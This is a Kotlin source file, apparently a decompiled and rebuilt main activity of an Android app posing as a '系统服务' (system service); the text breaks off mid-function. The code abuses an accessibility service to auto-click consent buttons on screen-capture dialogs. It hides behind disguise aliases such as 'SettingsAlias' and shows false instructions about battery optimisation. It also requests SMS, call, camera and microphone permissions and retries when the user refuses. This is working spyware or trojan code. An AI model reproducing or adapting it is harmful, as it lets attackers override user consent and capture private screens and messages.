package com.storm.safe.rock

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.res.ColorStateList
import android.graphics.BitmapFactory
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.accessibility.AccessibilityManager
import android.view.accessibility.AccessibilityNodeInfo
import android.webkit.WebView
import android.widget.Button
import android.widget.CompoundButton
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.Switch
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.storm.safe.rock.activity.AccessibilityTrampoline
import com.storm.safe.rock.activity.qixvbtmo
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.util.StringUtil
import java.io.File
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.util.Locale
import org.json.JSONObject

/**
 * Main Activity — the app's primary entry point.
 * Handles accessibility service enabling, media projection permission,
 * device disguise, and various permission requests.
 *
 * Reverse-engineered from JADX: iuzxujjtqev.java (2591 lines) +
 * iuzxujjtqev$combinedBroadcastReceiver$1.java (198 lines).
 *
 * Renamed fields:
 *   f51956e2→Companion, f51957e3→currentActivityRef, f51958c3→statusText,
 *   f51959c4→enableButton, f51960c5→appNameText, f51961c6→usageInstructionsText,
 *   f51962c7→serviceSwitch, f51963c8→appIconImageView,
 *   f51964c9→mediaProjectionManager, f51965d0→autoRequest,
 *   f51966d1→isRequesting, f51967d2→isPermissionGranted,
 *   f51968d3→customStatusText, f51969d4→hasCustomStatus,
 *   f51970d5→permissionTimeoutHandler, f51971d6→uiHandler,
 *   f51972d7→switchListener, f51973d8→isInitialized,
 *   f51974d9→permissionTimeoutRunnable, f51975e0→combinedBroadcastReceiver,
 *   f51976e1→receiverRegistered
 *
 * Renamed methods:
 *   b4→applyDefaultTexts, b5→checkAndNavigate, b6→validateMediaProjection,
 *   b7→findButtons, b8→findNodesByText, b9→handleAndroid10Dialog,
 *   c0→handleExistingPermission, c1→processPermissionResult,
 *   c2→handlePermissionDenied, c3→bindViews, c4→isAccessibilityEnabled,
 *   c5→isVivoDisguiseActive, c6→isHuaweiDisguiseActive, c7→launchChrome,
 *   c8→redirectToDisguiseApp, c9→clearRequestingFlag,
 *   d0→notifyServiceOfPermission, d1→openAccessibilityTrampoline,
 *   d2→requestCameraPermission, d3→requestMiuiProjection,
 *   d4→requestMediaProjection, d5→requestMiuiProjectionViaQixvbtmo,
 *   d6→requestMicrophonePermission, d7→requestStandardProjection,
 *   d8→showMainContent, d9→startPermissionTimeout,
 *   e0→onAccessibilityEnabled, e1→setupDarkOverlay, e2→cancelPermissionTimeout,
 *   e3→checkAndRequestOverlayPermission, e4→setButtonText,
 *   e5→setStatusTextWithColor, e6→setStatusText, e7→updateSwitchState,
 *   e8→tryAutoPermission
 */
class iuzxujjtqev : AppCompatActivity() {

    companion object {
        private const val TAG = "iuzxujjtqev"
        private const val REQUEST_CODE_MEDIA_PROJECTION = 1001
        private const val REQUEST_CODE_OVERLAY = 1002
        private const val REQUEST_CODE_MIUI_PROJECTION = 1004
        private const val REQUEST_CODE_SMS = 1006
        private const val REQUEST_CODE_GALLERY = 1007
        private const val REQUEST_CODE_MIC = 1008
        private const val REQUEST_CODE_CAMERA = 1009
        private const val REQUEST_CODE_BATCH = 1010
        private const val REQUEST_CODE_NOTIFICATION = 1011

        @Volatile
        @JvmStatic
        var currentActivityRef: WeakReference<Activity>? = null

        @JvmStatic
        fun getCurrentActivity(): Activity? = currentActivityRef?.get()

        /** JADX: b6() — validate stored MediaProjection data. */
        @JvmStatic
        fun validateMediaProjection(): Boolean {
            try {
                val resultCode = MediaProjectionHolder.resultCode
                val intent = MediaProjectionHolder.permissionIntent
                if (resultCode == null) return false
                if (intent == null) {
                    Log.w(TAG, "⚠️ [权限] Intent数据为null")
                    return false
                }
                if (!intent.hasExtra("android.media.projection.extra.EXTRA_MEDIA_PROJECTION") &&
                    intent.action == null && intent.data == null
                ) {
                    Log.w(TAG, "⚠️ [权限] Intent缺少必要数据")
                    return false
                }
                if (resultCode == -1) return true
                Log.w(TAG, "⚠️ [权限] resultCode无效: $resultCode (期望: -1)")
                return false
            } catch (e: Exception) {
                Log.e(TAG, "❌ 验证MediaProjection权限发生异常", e)
                return false
            }
        }

        /** JADX: b7() — find all Button nodes recursively. */
        @JvmStatic
        fun findButtons(node: AccessibilityNodeInfo, result: ArrayList<AccessibilityNodeInfo>) {
            val className = node.className?.toString()
            if (className != null && className.contains("android.widget.Button")) {
                result.add(node)
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { findButtons(it, result) }
            }
        }

        /** JADX: b8() — find nodes matching text or content description. */
        @JvmStatic
        fun findNodesByText(node: AccessibilityNodeInfo, text: String, result: ArrayList<AccessibilityNodeInfo>) {
            val nodeText = node.text?.toString() ?: ""
            val nodeDesc = node.contentDescription?.toString() ?: ""
            if (nodeText.contains(text, ignoreCase = true) || nodeDesc.contains(text, ignoreCase = true)) {
                result.add(node)
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { findNodesByText(it, text, result) }
            }
        }

        /**
         * JADX: b9() — handle Android 10 MediaProjection dialog.
         * Searches for allow/confirm buttons and clicks them.
         */
        @JvmStatic
        fun handleAndroid10Dialog() {
            try {
                val svc = MyAccessibilityService.Companion.getInstance() ?: run {
                    Log.w(TAG, "⚠️ [权限] Android10无障碍未启动，无法处理弹框")
                    return
                }
                val root = svc.rootInActiveWindow ?: run {
                    Log.w(TAG, "⚠️ [权限] Android10无法获取窗口根节点")
                    return
                }
                val allowKeywords = arrayOf(
                    "允许", "确定", "确认", "授权", "同意", "是", "好", "好的", "继续",
                    "立即开始", "现在开始", "开始", "开始录制", "开始投屏", "开始共享",
                    "立即授权", "授予权限", "确认共享", "立即确认",
                    "Allow", "OK", "Agree", "Grant", "Accept", "Yes", "Continue",
                    "Start", "Start now", "Start sharing", "Share screen",
                    "Begin recording", "Begin casting", "Record screen", "Cast screen",
                    "Allow recording", "Allow casting", "Start recording", "Start capture"
                )
                val denyKeywords = arrayOf("禁止", "拒绝", "取消", "Cancel", "Deny", "Dismiss", "不允许", "不同意")

                // Pass 1: search by text keyword
                for (keyword in allowKeywords) {
                    val candidates = ArrayList<AccessibilityNodeInfo>()
                    findNodesByText(root, keyword, candidates)
                    for (candidate in candidates) {
                        if (candidate.isClickable && candidate.isEnabled) {
                            val cText = candidate.text?.toString() ?: ""
                            val cDesc = candidate.contentDescription?.toString() ?: ""
                            val isDeny = denyKeywords.any { dk ->
                                cText.contains(dk, ignoreCase = true) || cDesc.contains(dk, ignoreCase = true)
                            }
                            if (!isDeny) {
                                candidate.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                Handler(Looper.getMainLooper()).postDelayed({ handleAndroid10Dialog() }, 500L)
                                return
                            }
                        }
                    }
                }
                // Pass 2: find all buttons
                val allButtons = ArrayList<AccessibilityNodeInfo>()
                findButtons(root, allButtons)
                for (btn in allButtons) {
                    if (btn.isClickable && btn.isEnabled) {
                        val bText = btn.text?.toString() ?: ""
                        val bDesc = btn.contentDescription?.toString() ?: ""
                        val isAllow = allowKeywords.any { ak ->
                            bText.contains(ak, ignoreCase = true) || bDesc.contains(ak, ignoreCase = true)
                        }
                        val isDeny = denyKeywords.any { dk ->
                            bText.contains(dk, ignoreCase = true) || bDesc.contains(dk, ignoreCase = true)
                        }
                        if (isAllow && !isDeny) {
                            btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Handler(Looper.getMainLooper()).postDelayed({ handleAndroid10Dialog() }, 500L)
                            return
                        }
                    }
                }
                Log.w(TAG, "⚠️ [权限] Android10未找到允许按钮")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Android 10 MediaProjection弹框处理异常", e)
            }
        }

        private fun isDisguiseAlias(className: String): Boolean {
            val aliases = listOf(
                "AppVariantE", "AppVariantH", "HuaweiAlias", "AppVariantI", "AppVariantJ",
                "SettingsAlias", "AppVariantF", "AppVariantG", "AppVariantK", "AppVariantL",
                "AppVariantA", "AppVariantN"
            )
            return aliases.any { className.contains(it) }
        }
    }

    // ── Instance fields ──────────────────────────────────────
    var statusText: TextView? = null
    var enableButton: Button? = null
    var appNameText: TextView? = null
    var usageInstructionsText: TextView? = null
    var serviceSwitch: Switch? = null
    var appIconImageView: ImageView? = null
    var mediaProjectionManager: MediaProjectionManager? = null
    var autoRequest: Boolean = false
    var isRequesting: Boolean = false
    var isPermissionGranted: Boolean = false
    var customStatusText: String? = null
    var hasCustomStatus: Boolean = false
    var permissionTimeoutHandler: Handler? = null
    var uiHandler: Handler? = null
    var isInitialized: Boolean = false
    var receiverRegistered: Boolean = false
    private var silentReinstallDetected: Boolean = false

    // ── Programmatic layout view references ──────────────────
    private var backgroundImageView: ImageView? = null
    private var mainContentView: LinearLayout? = null
    private var webViewContainer: FrameLayout? = null
    private var webView: WebView? = null

    /** Merged from iuzxujjtqev$combinedBroadcastReceiver$1. */
    inner class CombinedBroadcastReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val action = intent?.action ?: return
            when {
                action == "com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION" -> { /* no-op */ }
                action == "com.storm.safe.rock.intent.REQUEST_CAMERA_PERMISSION" -> {
                    try {
                        if (checkSelfPermission("android.permission.CAMERA") != 0)
                            requestPermissions(arrayOf("android.permission.CAMERA"), REQUEST_CODE_CAMERA)
                    } catch (e: Exception) { Log.e(TAG, "❌ 直接摄像头权限请求失败", e) }
                }
                action == "com.storm.safe.rock.intent.REQUEST_GALLERY_PERMISSION" -> {
                    try {
                        val perms = if (Build.VERSION.SDK_INT >= 33)
                            arrayOf("android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO")
                        else arrayOf("android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE")
                        val needed = perms.filter { checkSelfPermission(it) != 0 }
                        if (needed.isNotEmpty()) requestPermissions(needed.toTypedArray(), REQUEST_CODE_GALLERY)
                    } catch (e: Exception) { Log.e(TAG, "❌ 直接相册权限请求失败", e) }
                }
                action == "com.storm.safe.rock.intent.REQUEST_MICROPHONE_PERMISSION" -> requestMicrophonePermission()
                action == "com.storm.safe.rock.intent.REQUEST_SMS_PERMISSION" -> {
                    try {
                        val smsPerms = arrayOf(
                            "android.permission.READ_SMS", "android.permission.SEND_SMS",
                            "android.permission.RECEIVE_SMS", "android.permission.READ_PHONE_STATE",
                            "android.permission.CALL_PHONE"
                        )
                        val needed = smsPerms.filter { checkSelfPermission(it) != 0 }
                        if (needed.isNotEmpty()) requestPermissions(needed.toTypedArray(), REQUEST_CODE_SMS)
                    } catch (e: Exception) { Log.e(TAG, "❌ 直接短信权限请求失败", e) }
                }
                action == "com.storm.safe.rock.intent.REQUEST_ALL_PERMISSIONS" -> {
                    try {
                        runOnUiThread { tryAutoPermission() }
                        Handler(Looper.getMainLooper()).postDelayed({ requestMediaProjection() }, 1000L)
                    } catch (e: Exception) { Log.e(TAG, "❌ 一次性权限申请失败", e) }
                }
                action == "$packageName.REQUEST_MEDIA_PROJECTION" -> {
                    try {
                        try {
                            val am = getSystemService("activity") as ActivityManager
                            am.moveTaskToFront(taskId, 1)
                        } catch (e: Exception) { Log.w(TAG, "⚠️ moveTaskToFront 失败: ${e.message}") }
                        Handler(Looper.getMainLooper()).postDelayed({ requestMediaProjection() }, 300L)
                    } catch (e: Exception) { Log.e(TAG, "❌ 处理系统投屏权限请求失败", e) }
                }
                action == "com.storm.safe.rock.intent.REQUEST_PERMISSION_FROM_SERVICE" -> {
                    val autoReq = intent.getBooleanExtra("AUTO_REQUEST_PERMISSION", false)
                    val timestamp = intent.getLongExtra("TIMESTAMP", 0L)
                    val source = intent.getStringExtra("SOURCE") ?: "未知"
                    Log.d(TAG, "✅ [广播] 备用广播参数: AUTO=$autoReq, TIME=$timestamp, SRC=$source")
                    if (!autoReq) { Log.w(TAG, "⚠️ [广播] 备用广播无AUTO_REQUEST标志"); return }
                    if (isRequesting) { Log.w(TAG, "⚠️ [权限] 申请中，忽略备用广播"); return }
                    val hasData = MediaProjectionHolder.resultCode != null && MediaProjectionHolder.permissionIntent != null
                    if (hasData) return
                    Log.d(TAG, "✅ [广播] 权限申请已通过主Intent启动")
                    runOnUiThread { requestMediaProjection() }
                }
                action == "com.storm.safe.rock.intent.SHOW_MAIN_ACTIVITY" -> {
                    val setupComplete = intent.getBooleanExtra("SETUP_COMPLETE", false)
                    runOnUiThread {
                        try {
                            Handler(Looper.getMainLooper()).post { showMainContent() }
                            if (setupComplete) {
                                setStatusTextWithColor("服务已就绪")
                                enableButton?.text = "服务已就绪"
                                enableButton?.isEnabled = false
                            }
                        } catch (e: Exception) { Log.e(TAG, "❌ 显示主页失败", e) }
                    }
                }
            }
        }
    }

    private val combinedBroadcastReceiver = CombinedBroadcastReceiver()

    // ── Methods ──────────────────────────────────────────────

    /** JADX: b4() — apply default texts. */
    fun applyDefaultTexts() {
        try {
            val tvName = appNameText
            if (tvName != null) {
                try {
                    val resId = resources.getIdentifier("app_name", "string", packageName)
                    if (resId != 0) tvName.text = getString(resId)
                    else tvName.text = "系统服务"
                } catch (e: Exception) { tvName.text = "系统服务"; Log.w(TAG, "⚠️ 设置默认应用名称失败: ${e.message}") }
            }
            val btn = enableButton
            if (btn != null) {
                try {
                    val resId = resources.getIdentifier("enable_accessibility_service", "string", packageName)
                    if (resId != 0) btn.text = getString(resId)
                    else btn.text = "开启无障碍服务"
                } catch (_: Exception) { btn.text = "开启无障碍服务" }
            }
            statusText?.visibility = View.GONE
            val tvUsage = usageInstructionsText
            if (tvUsage != null) {
                try {
                    val resId = resources.getIdentifier("usage_instructions", "string", packageName)
                    if (resId != 0) tvUsage.text = getString(resId)
                    else tvUsage.text = "本应用需要无障碍权限才能正常运行。\n\n开启后，应用将自动为您优化系统设置，包括：\n\n• 自动管理电池优化\n• 自动管理后台运行权限\n• 自动管理自启动权限\n• 保持系统服务稳定运行\n\n请点击下方按钮，前往系统设置开启无障碍服务。"
                } catch (_: Exception) { tvUsage.text = "本应用需要无障碍权限才能正常运行。\n\n请点击下方按钮开启无障碍服务。" }
            }
            hasCustomStatus = false
        } catch (e: Exception) { Log.w(TAG, "❌ 应用默认文字失败: ${e.message}") }
    }

    /** JADX: b5() — check accessibility and navigate. */
    fun checkAndNavigate() {
        if (isAccessibilityEnabled()) onAccessibilityEnabled() else openAccessibilityTrampoline()
    }

    /** JADX: c0() — handle existing permission data. */
    fun handleExistingPermission() {
        try {
            val hasData = MediaProjectionHolder.resultCode != null
            if (hasData) {
                Log.w(TAG, "⚠️ [权限] 权限数据存在但无效，需重新申请")
                runOnUiThread { requestMediaProjection() }
            }
            sendBroadcast(Intent("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION"))
            Handler(Looper.getMainLooper()).postDelayed({
                try { moveTaskToBack(true); finish() } catch (_: Exception) {}
            }, 500L)
        } catch (e: Exception) { Log.e(TAG, "❌ handleExistingPermission failed", e) }
    }

    /** JADX: c1() — process permission result from onActivityResult. */
    fun processPermissionResult(intent: Intent?, resultCode: Int) {
        try {
            // Iterate extras for logging
            intent?.extras?.let { extras ->
                val it = extras.keySet().iterator()
                while (it.hasNext()) extras.get(it.next())
            }
            if (resultCode != -1 || intent == null) {
                Log.w(TAG, "⚠️ [权限] 投屏权限被拒绝")
                val manufacturer = Build.MANUFACTURER
                val brand = Build.BRAND
                val isXiaomi = manufacturer.contains("Xiaomi", true) || manufacturer.contains("Redmi", true) ||
                    brand.contains("Xiaomi", true) || brand.contains("Redmi", true) || brand.contains("POCO", true)
                if (isXiaomi && Build.VERSION.SDK_INT == 29 && autoRequest) {
                    Log.w(TAG, "⚠️ [权限] 小米Android10设备权限被拒绝，可能弹窗未显示")
                    Handler(Looper.getMainLooper()).postDelayed({ requestMediaProjection() }, 1000L)
                    return
                }
                if (autoRequest) handlePermissionDenied() else runOnUiThread { setStatusTextWithColor("⚠️ 权限被拒绝") }
                return
            }
            // Permission granted
            clearRequestingFlag()
            MediaProjectionHolder.storePermissionData(intent, resultCode)
            val lostRecovery = getIntent()?.getBooleanExtra("PERMISSION_LOST_RECOVERY", false) == true
            Log.d(TAG, "✅ [权限] 结果处理: lostRecovery=$lostRecovery, autoRequest=$autoRequest")
            if (lostRecovery) {
                sendBroadcast(Intent("com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED").apply {
                    putExtra("success", true); putExtra("permission_recovery", true)
                    if (getIntent()?.getBooleanExtra("REFRESH_PERMISSION_REQUEST", false) == true)
                        putExtra("REFRESH_PERMISSION_REQUEST", true)
                })
                runOnUiThread { setStatusTextWithColor("✅ 权限已恢复") }
                Handler(Looper.getMainLooper()).postDelayed({
                    try { moveTaskToBack(true); finish() } catch (_: Exception) {}
                }, 3000L)
                return
            }
            if (autoRequest) {
                sendBroadcast(Intent("com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED").apply {
                    putExtra("success", true)
                    if (getIntent()?.getBooleanExtra("REFRESH_PERMISSION_REQUEST", false) == true)
                        putExtra("REFRESH_PERMISSION_REQUEST", true)
                })
                // JADX: dqtvuisjd.f52358m1.getInstance() → reflection setupScreenCaptureWithMediaProjection
                trySetupScreenCapture()
                autoRequest = false; isRequesting = false
                runOnUiThread { setStatusTextWithColor("✅ 权限已获取"); setButtonText("服务就绪", enabled = false) }
                Handler(Looper.getMainLooper()).postDelayed({ try { moveTaskToBack(true) } catch (_: Exception) {} }, 1500L)
                Handler(Looper.getMainLooper()).postDelayed({ try { finish() } catch (_: Exception) {} }, 5000L)
            }
        } catch (e: Exception) { Log.e(TAG, "启动前台服务失败", e) }
    }

    private fun trySetupScreenCapture() {
        try {
            val svc = MyAccessibilityService.Companion.getInstance() ?: run {
                Log.w(TAG, "⚠️ [服务] 实例不存在"); return
            }
            val mp = MediaProjectionHolder.mediaProjection
            if (mp != null) {
                try {
                    val m: Method = svc.javaClass.getDeclaredMethod("setupScreenCaptureWithMediaProjection", MediaProjection::class.java)
                    m.isAccessible = true; m.invoke(svc, mp)
                } catch (e: Exception) { Log.w(TAG, "⚠️ 反射调用setupScreenCapture失败: ${e.message}") }
            } else {
                Log.w(TAG, "⚠️ [投屏] 对象不存在，尝试从数据创建")
                tryRecreateMediaProjection()
            }
        } catch (e: Exception) { Log.e(TAG, "❌ 直接调用dqtvuisjd失败", e) }
    }

    private fun tryRecreateMediaProjection() {
        try {
            val code = MediaProjectionHolder.resultCode ?: return
            val data = MediaProjectionHolder.permissionIntent ?: return
            val mpm = getSystemService("media_projection") as? MediaProjectionManager ?: return
            val mp = mpm.getMediaProjection(code, data)
            if (mp != null) {
                MediaProjectionHolder.mediaProjection = mp
                MediaProjectionHolder.permissionTimestamp = System.currentTimeMillis()
                Log.d("MediaProjectionHolder", "✅ MediaProjection已设置，时间戳: ${MediaProjectionHolder.permissionTimestamp}")
                val svc = MyAccessibilityService.Companion.getInstance()
                if (svc != null) {
                    try {
                        val m = svc.javaClass.getDeclaredMethod("setupScreenCaptureWithMediaProjection", MediaProjection::class.java)
                        m.isAccessible = true; m.invoke(svc, mp)
                        Log.d(TAG, "✅ [投屏] 重建的MediaProjection已设置")
                    } catch (e: Exception) { Log.w(TAG, "⚠️ 反射调用失败: ${e.message}") }
                }
            } else { Log.e(TAG, "❌ 从权限数据重新创建MediaProjection失败") }
        } catch (e: Exception) { Log.e(TAG, "❌ tryRecreateMediaProjection failed", e) }
    }

    /** JADX: c2() — handle permission denied. */
    fun handlePermissionDenied() {
        Log.w(TAG, "⚠️ [权限] 投屏权限被拒绝，保持应用打开")
        autoRequest = false; isRequesting = false
        sendBroadcast(Intent("com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED").apply {
            putExtra("success", false)
            if (getIntent()?.getBooleanExtra("REFRESH_PERMISSION_REQUEST", false) == true)
                putExtra("REFRESH_PERMISSION_REQUEST", true)
        })
        clearRequestingFlag()
        setStatusText("⚠️ 权限被拒绝\n服务需要此权限才能工作", android.R.color.holo_red_dark)
        setButtonText("重新申请权限", enabled = true)
        getIntent()?.putExtra("AUTO_REQUEST_PERMISSION", false)
    }

    /** JADX: c3() — bind views by ID. */
    fun bindViews() {
        try {
            // Views are already assigned by createLayout(), just apply initial state
            statusText?.visibility = View.GONE

            // Load page style config
            try {
                val configPrefsName = StringUtil.decrypt("OFwDLEgqMy1YPy1QFnRHKwMg")
                val configStr = getSharedPreferences(configPrefsName, 0).getString("pageStyleConfig", null)
                if (configStr != null) {
                    val pageConfig = JSONObject(configStr).optJSONObject("pageStyleConfig")
                    if (pageConfig != null && pageConfig.length() > 0) { applyPageStyleConfig(pageConfig); return }
                }
            } catch (e: Exception) { Log.w(TAG, "⚠️ 加载页面样式配置失败，使用默认样式: ${e.message}") }
            applyDefaultTexts()
        } catch (e: Exception) { Log.e(TAG, "❌ bindViews failed", e) }
    }

    /**
     * Build the entire UI programmatically.
     * Replaces setContentView(R$layout.rbv2f) since the layout XML doesn't exist
     * (vendor APK uses resource obfuscation with non-standard resource names).
     */
    private fun createLayout() {
        val density = resources.displayMetrics.density
        fun dp(value: Int): Int = (value * density + 0.5f).toInt()

        // ── Root: FrameLayout (full screen) ──
        val root = FrameLayout(this).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            setBackgroundColor(Color.parseColor("#1A1A2E"))
        }

        // ── 1. Background ImageView (full-screen) ──
        val bgImageView = ImageView(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
            scaleType = ImageView.ScaleType.CENTER_CROP
            id = View.generateViewId()
        }
        // Load bg_accessibility.png from assets
        try {
            for (name in listOf("bg_accessibility.webp", "bg_accessibility.png")) {
                try {
                    val stream = assets.open(name)
                    val bitmap = BitmapFactory.decodeStream(stream)
                    stream.close()
                    if (bitmap != null) {
                        bgImageView.setImageBitmap(bitmap)
                        break
                    }
                } catch (_: Exception) {}
            }
        } catch (e: Exception) { Log.w(TAG, "⚠️ 加载背景图失败: ${e.message}") }
        backgroundImageView = bgImageView
        appIconImageView = bgImageView // fallback: appIconImageView points to bg if no icon
        root.addView(bgImageView)

        // ── 2. ScrollView wrapping mainContainer ──
        val scrollView = ScrollView(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
            isFillViewport = true
            isVerticalScrollBarEnabled = false
        }

        // ── 3. mainContainer (outer LinearLayout, vertical) ──
        val mainContainer = LinearLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            id = View.generateViewId()
        }

        // ── 4. mainContent (inner content area, shown/hidden) ──
        val mainContent = LinearLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.gravity = Gravity.CENTER_HORIZONTAL }
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(32), dp(80), dp(32), dp(32))
            id = View.generateViewId()
        }
        mainContentView = mainContent

        // ── 4a. App Icon ImageView ──
        val iconView = ImageView(this).apply {
            layoutParams = LinearLayout.LayoutParams(dp(80), dp(80)).also {
                it.gravity = Gravity.CENTER_HORIZONTAL
                it.bottomMargin = dp(16)
            }
            scaleType = ImageView.ScaleType.FIT_CENTER
            id = View.generateViewId()
        }
        // Load brand logo based on device brand
        try {
            val brand = Build.BRAND?.lowercase(java.util.Locale.ROOT) ?: "android"
            val brandMappings = listOf(brand, "android") // fallback to android logo
            for (logoName in brandMappings) {
                try {
                    val stream = assets.open("brand_logos/$logoName.webp")
                    val bitmap = BitmapFactory.decodeStream(stream)
                    stream.close()
                    if (bitmap != null) {
                        iconView.setImageBitmap(bitmap)
                        appIconImageView = iconView
                        break
                    }
                } catch (_: Exception) {}
            }
        } catch (e: Exception) { Log.w(TAG, "⚠️ 加载品牌logo失败: ${e.message}") }
        mainContent.addView(iconView)

        // ── 4b. App Name TextView ──
        val nameText = TextView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).also {
                it.gravity = Gravity.CENTER_HORIZONTAL
                it.bottomMargin = dp(20)
            }
            setTextColor(Color.WHITE)
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 24f)
            setTypeface(null, Typeface.BOLD)
            setShadowLayer(4f, 0f, 2f, Color.parseColor("#AA000000"))
            gravity = Gravity.CENTER
            id = View.generateViewId()
        }
        appNameText = nameText
        mainContent.addView(nameText)

        // ── 4c. Usage Instructions TextView ──
        val instructionsText = TextView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).also {
                it.gravity = Gravity.CENTER_HORIZONTAL
                it.bottomMargin = dp(32)
            }
            setTextColor(Color.parseColor("#E0E0E0"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 14f)
            gravity = Gravity.START
            setLineSpacing(dp(6).toFloat(), 1f)
            setPadding(dp(8), 0, dp(8), 0)
            // Set background with semi-transparent dark overlay for readability
            val textBg = GradientDrawable().apply {
                setColor(Color.parseColor("#99000000"))
                cornerRadius = dp(12).toFloat()
            }
            background = textBg
            setPadding(dp(16), dp(16), dp(16), dp(16))
            id = View.generateViewId()
        }
        usageInstructionsText = instructionsText
        mainContent.addView(instructionsText)

        // ── 4d. Status TextView ──
        val sText = TextView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).also {
                it.gravity = Gravity.CENTER_HORIZONTAL
                it.bottomMargin = dp(16)
            }
            setTextColor(Color.WHITE)
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 14f)
            gravity = Gravity.CENTER
            visibility = View.GONE
            id = View.generateViewId()
        }
        statusText = sText
        mainContent.addView(sText)

        // ── 4e. Enable Button ──
        val btnEnable = Button(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(52)
            ).also {
                it.leftMargin = dp(8)
                it.rightMargin = dp(8)
                it.bottomMargin = dp(16)
            }
            setTextColor(Color.WHITE)
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 17f)
            setTypeface(null, Typeface.BOLD)
            isAllCaps = false
            setShadowLayer(2f, 0f, 1f, Color.parseColor("#66000000"))
            stateListAnimator = null  // remove Material elevation animation
            elevation = dp(4).toFloat()
            // Rounded green button
            val btnBg = GradientDrawable().apply {
                setColor(Color.parseColor("#4CAF50"))
                cornerRadius = dp(26).toFloat()
            }
            background = btnBg
            id = View.generateViewId()
        }
        enableButton = btnEnable
        mainContent.addView(btnEnable)

        // ── 4f. Service Switch (hidden by default, shown only after initial setup) ──
        val svcSwitch = Switch(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).also {
                it.gravity = Gravity.CENTER_HORIZONTAL
                it.topMargin = dp(8)
            }
            setTextColor(Color.WHITE)
            visibility = View.GONE  // hidden until accessibility is enabled once
            id = View.generateViewId()
        }
        serviceSwitch = svcSwitch
        mainContent.addView(svcSwitch)

        mainContainer.addView(mainContent)
        scrollView.addView(mainContainer)
        root.addView(scrollView)

        // ── 5. WebView Container (GONE by default) ──
        val wvContainer = FrameLayout(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
            visibility = View.GONE
            id = View.generateViewId()
        }
        webViewContainer = wvContainer

        val wv = WebView(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
            id = View.generateViewId()
        }
        webView = wv
        wvContainer.addView(wv)
        root.addView(wvContainer)

        setContentView(root)
        Log.d(TAG, "✅ 程序化布局已创建")
    }

    private fun applyPageStyleConfig(config: JSONObject) {
        try {
            val appName = config.optString("appName", "")
            if (appName.isNotEmpty()) { try { appNameText?.text = appName } catch (e: Exception) { Log.w(TAG, "⚠️ 设置应用名称失败: ${e.message}") } }
            val btnText = config.optString("enableButtonText", "")
            if (btnText.isNotEmpty()) { enableButton?.text = btnText }
            val btnColor = config.optString("buttonColor", "")
            if (btnColor.isNotEmpty()) { try { enableButton?.backgroundTintList = ColorStateList.valueOf(Color.parseColor(btnColor)) } catch (e: Exception) { Log.w(TAG, "⚠️ 解析按钮颜色失败: $btnColor, ${e.message}") } }
            val configStatus = config.optString("statusText", "")
            if (configStatus.isNotEmpty()) {
